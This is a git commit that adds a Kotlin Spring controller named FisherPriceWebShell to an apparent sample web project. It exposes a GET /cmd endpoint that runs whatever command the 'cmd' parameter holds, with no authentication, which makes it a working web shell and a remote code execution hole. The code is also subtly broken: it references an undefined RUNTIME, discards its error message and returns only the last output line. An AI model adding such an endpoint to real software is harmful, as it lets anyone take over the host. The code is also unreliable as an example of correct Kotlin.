4453b8c1d18d3272cb1c13f7ffb68f026a38e8e8
Roy Kachouh <roykachouh@gmail.com>
2018-01-09 16:13:56 -0800

    Add simple fisher price shell

---
+++ src/main/kotlin/com/kachouh/ecs/sample/web/FisherPriceWebShell.kt
@@ -0,0 +1,33 @@
+package com.kachouh.ecs.sample.web
+
+import org.springframework.web.bind.annotation.GetMapping
+import org.springframework.web.bind.annotation.RequestParam
+import org.springframework.web.bind.annotation.RestController
+import java.io.BufferedReader
+import java.io.InputStreamReader
+
+
+@RestController
+class FisherPriceWebShell() {
+
+    @GetMapping("/cmd")
+    fun helloEcs(@RequestParam(value = "cmd", defaultValue = "pwd") name: String): String {
+        return exec(name)
+    }
+
+    fun exec(cmd: String): String {
+        var response = "N/A"
+        try {
+            val process = RUNTIME.exec(cmd)
+            process.waitFor()
+            val bri = BufferedReader(InputStreamReader(process.inputStream))
+            var line: String? = null
+            while ({ line = bri.readLine(); line }() != null) {
+                response = line!!
+            }
+        } catch (e: Exception) {
+            "Could not fetch response: " + e.message
+        }
+        return response
+    }
+}
